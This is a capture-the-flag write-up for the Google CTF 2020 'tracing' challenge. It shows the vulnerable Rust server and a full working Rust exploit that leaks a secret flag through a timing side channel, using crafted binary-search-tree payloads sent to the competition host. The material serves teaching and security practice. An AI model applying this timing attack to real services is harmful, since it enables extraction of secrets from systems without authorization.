+++
title = "Tracing"
weight = 1
+++

# tracing

_pwn, easy_

[source](https://github.com/tamucybersec/gctf-2020/tree/master/pwn/tracing)

> An early prototype of a contact tracing database is deployed for the developers to test, but is configured with some sensitive data. See if you can extract it.

## initial review

we are provided a rust source package.  A quick scan of the Cargo.toml shows that no dependencies have known vulnerabilities.  

```toml
[package]
name = "pwn-tracing"
version = "0.1.0"
authors = ["Robin McCorkell <rmccorkell@google.com>"]
edition = "2018"

[dependencies]
log = "0.4.8"
env_logger = "0.7.1"
futures = "0.3.5"
uuid = "0.8.1"

[dependencies.async-std]
version = "1.6.1"
features = ["attributes"]
```

```
❯ grep -r "unsafe" .
```

A quick grep shows that there are no unsafe keywords which means we are likely looking at a logic error.  


```rust
use async_std::net::{TcpListener, TcpStream};
use async_std::prelude::*;
use log::{debug, warn};
use pwn_tracing::bst::BinarySearchTree;
use uuid::Uuid;

const BIND_ADDR: &str = "0.0.0.0:1337";

async fn accept(mut stream: TcpStream, checks: Vec<Uuid>) -> std::io::Result<()> {
    debug!("Accepted connection");
    let bytes = (&stream).bytes().map(|b| b.unwrap());
    let chunks = {
        // Ugh, async_std::prelude::StreamExt doesn't have chunks(),
        // but it conflicts with futures::stream::StreamExt for the methods it
        // does have.
        use futures::stream::StreamExt;
        bytes.chunks(16)
    };
    let mut count: u32 = 0;
    let ids = chunks.filter_map(|bytes| {
        count += 1;
        Uuid::from_slice(&bytes).ok()
    });
    let tree = {
        use futures::stream::StreamExt;
        ids.collect::<BinarySearchTree<_>>()
    }
    .await;
    debug!("Received {} IDs", count);
    stream.write_all(&count.to_be_bytes()).await?;

    debug!("Checking uploaded IDs for any matches");
    checks
        .iter()
        .filter(|check| tree.contains(check))
        .for_each(|check| warn!("Uploaded IDs contain {}!", check));
    stream.shutdown(std::net::Shutdown::Both)?;
    debug!("Done");
    Ok(())
}

#[async_std::main]
async fn main() -> std::io::Result<()> {
    env_logger::init();

    let checks: Vec<Uuid> = std::env::args()
        .skip(1)
        .map(|arg| Uuid::from_slice(arg.as_bytes()).unwrap())
        .collect();

    debug!("Loaded checks: {:?}", checks);

    let listener = TcpListener::bind(BIND_ADDR).await?;
    let mut incoming = listener.incoming();

    while let Some(stream) = incoming.next().await {
        let stream = stream?;
        async_std::task::spawn(accept(stream, checks.clone()));
    }
    Ok(())
}
```



To summarize: 

1. Load arguments as stored UUIDs
2. Start up TCP server
3. Read input from a connection, split it into 16 byte chunks, and map it into UUIDs
4. Write the number of received UUIDs back to the client
5. Construct a binary search tree from the received UUIDs
6. Check if the arg UUIDs are in that binary tree and if so say something in the log
7. Close the connection

We get very little data back from the server.  From the note provided with the challenge it seems likely that our flag is stored in the arg UUIDs but we don't have any obvious ways to extract that because we don't get feedback based on how the binary search works out. 

## attack overview

We realized that we although we couldn't get any feedback directly, we could perform a timing attack.  By constructing a binary tree such that uuids lower than the node hit the end of the tree immediately and uuids higher have to traverse a long tail we can leak which direction the character is in.  By performing a binary search (heh) we can narrow this down to the exact byte in 8 connections.  This can be done for everything except the last two characters because of how we created the payload.  Fortunately, we know that the last character in the flag is a closing bracket and the 2nd to last character was obvious from context.  

```rust
use itertools::Itertools;
use std::cmp::Ordering;
use std::cmp::Ordering::{Equal, Greater, Less};
use std::error::Error;
use std::iter::Iterator;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::join;
use tokio::net::TcpStream;
use tokio::time::delay_for;

fn create_payload(known: &[u8], i: u8) -> Vec<[u8; 16]> {
    (0..=0xff)
        .cartesian_product(0..=0x2f)
        .map(|(l, r)| {
            let mut res = [0u8; 16];
            res[0..known.len()].clone_from_slice(&known[..]);
            res[known.len()] = i;
            res[known.len() + 1] = l;
            res[known.len() + 2] = r;
            res
        })
        .collect::<Vec<[u8; 16]>>()
}

async fn attack(entries: Vec<[u8; 16]>) -> Result<Duration, Box<dyn Error>> {
    let mut total = Duration::new(0, 0);
    let mut tasks = Vec::new();

    let NUM_TRIES: u8 = 3;

    for _ in 0..NUM_TRIES {
        let entries = entries.clone();
        tasks.push(tokio::spawn(async move {
            let (mut read, mut write) = TcpStream::connect("tracing.2020.ctfcompetition.com:1337")
                // let (mut read, mut write) = TcpStream::connect("localhost:1337")
                .await
                .unwrap()
                .into_split();
            for e in &entries {
                write.write_all(e).await.unwrap();
            }

            let mut resp = Vec::new();
            write.flush().await.unwrap();
            delay_for(Duration::new(10, 0)).await;
            write.shutdown().await.unwrap();
            let mut buf = [0; 4];
            read.read(&mut buf).await.unwrap();
            let start = Instant::now();
            read.read_to_end(&mut resp).await.unwrap();
            let elapsed = start.elapsed();


            assert_eq!(entries.len() as u32, u32::from_be_bytes(buf));
            elapsed
        }));
    }

    for task in tasks {
        total += task.await?;
    }

    Ok(total / NUM_TRIES as u32)
}

async fn discover_next(known: &[u8]) -> Result<u8, Box<dyn Error>> {
    let time_low = Duration::from_millis(10);

    let mut first = 0;
    let mut it = 0;
    let mut step = 0;
    let mut count = 255;
    while count > 0 {
        it = first;
        step = count / 2;
        it += step;
        let duration = {
            let mut curr = Duration::from_millis(0);
            loop {
                let temp = attack(create_payload(known, it)).await;
                if temp.is_ok() {
                    curr = temp.unwrap();
                    break;
                }
            }
            curr
        };
        if duration > time_low {
            it += 1;
            first = it;
            count -= step + 1
        } else {
            count = step;
        }
        println!("{} - {} - {:?}", it, step, duration);
    }
    it -= 1;
    Ok(it)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let mut flag: Vec<u8> = "".bytes().collect();
    // can't consistently crack the last two chars because there isn't space to make long binary tree branches
    // the last char is known to be } because of the flag format but the second to last char just needs to be guessed
    // it was pretty obviously e from the pattern
    for _ in 0..14 {
        let next = discover_next(&flag).await?;
        flag.push(next);
        println!("flag thus far: {}", String::from_utf8_lossy(&flag));
    }
    assert_eq!( String::from_utf8_lossy(&flag) + "e}", "CTF{1BitAtATime}");
    Ok(())
}
```